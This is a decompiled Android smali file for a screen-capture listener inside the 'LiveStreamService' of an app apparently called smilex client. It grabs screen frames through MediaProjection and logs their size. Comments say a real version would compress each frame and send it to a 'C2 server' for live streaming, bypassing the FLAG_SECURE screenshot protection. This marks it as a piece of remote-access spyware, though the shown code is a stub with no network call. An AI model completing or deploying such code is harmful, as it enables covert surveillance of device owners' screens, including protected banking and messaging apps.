.class Lcom/smilex/client/services/LiveStreamService$1;
.super Ljava/lang/Object;
.source "LiveStreamService.java"

# interfaces
.implements Landroid/media/ImageReader$OnImageAvailableListener;


# annotations
.annotation system Ldalvik/annotation/EnclosingMethod;
    value = Lcom/smilex/client/services/LiveStreamService;->startScreenCapture(Landroid/content/Intent;)V
.end annotation

.annotation system Ldalvik/annotation/InnerClass;
    accessFlags = 0x0
    name = "1"
.end annotation


# instance fields
.field final synthetic this$0:Lcom/smilex/client/services/LiveStreamService;


# direct methods
.method constructor <init>(Lcom/smilex/client/services/LiveStreamService;)V
    .registers 2
    .param p1, "this$0"

    iput-object p1, p0, Lcom/smilex/client/services/LiveStreamService$1;->this$0:Lcom/smilex/client/services/LiveStreamService;
    invoke-direct {p0}, Ljava/lang/Object;-><init>()V
    return-void
.end method


# virtual methods
.method public onImageAvailable(Landroid/media/ImageReader;)V
    .registers 6
    .param p1, "reader"

    const/4 v0, 0x0

    invoke-virtual {p1}, Landroid/media/ImageReader;->acquireLatestImage()Landroid/media/Image;
    move-result-object v0

    if-eqz v0, :end_method

    invoke-virtual {v0}, Landroid/media/Image;->getPlanes()[Landroid/media/Image$Plane;
    move-result-object v1

    const/4 v2, 0x0
    aget-object v1, v1, v2

    invoke-virtual {v1}, Landroid/media/Image$Plane;->getBuffer()Ljava/nio/ByteBuffer;
    move-result-object v1

    # In a real implementation, this ByteBuffer would be processed (e.g., converted to JPEG,
    # compressed, and sent over the network to the C2 server for live streaming).
    # The FLAG_SECURE bypass is achieved because MediaProjection captures the raw pixel data
    # before the FLAG_SECURE flag can prevent screenshotting.

    sget-object v2, Lcom/smilex/client/services/LiveStreamService;->TAG:Ljava/lang/String;
    new-instance v3, Ljava/lang/StringBuilder;
    invoke-direct {v3}, Ljava/lang/StringBuilder;-><init>()V
    const-string v4, "Captured frame size: "
    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
    invoke-virtual {v1}, Ljava/nio/ByteBuffer;->remaining()I
    move-result v4
    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;
    invoke-virtual {v3}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;
    move-result-object v3
    invoke-static {v2, v3}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    invoke-virtual {v0}, Landroid/media/Image;->close()V

    :end_method
    return-void
.end method
